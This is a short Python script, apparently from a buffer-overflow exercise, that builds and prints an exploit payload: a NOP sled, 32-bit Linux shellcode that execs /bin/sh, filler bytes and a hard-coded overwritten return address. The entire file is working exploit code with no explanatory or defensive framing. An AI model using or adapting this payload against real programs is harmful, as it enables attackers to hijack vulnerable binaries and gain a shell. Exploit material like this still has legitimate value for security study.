#!/usr/bin/python
NOP='\x90'*32
shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80'
padding='A'*47
eip='\x20\xc9\xff\xff'  # found by examining the stack during execution with this file's output
payload=NOP+shellcode+padding+eip
print(payload)
# print(padding)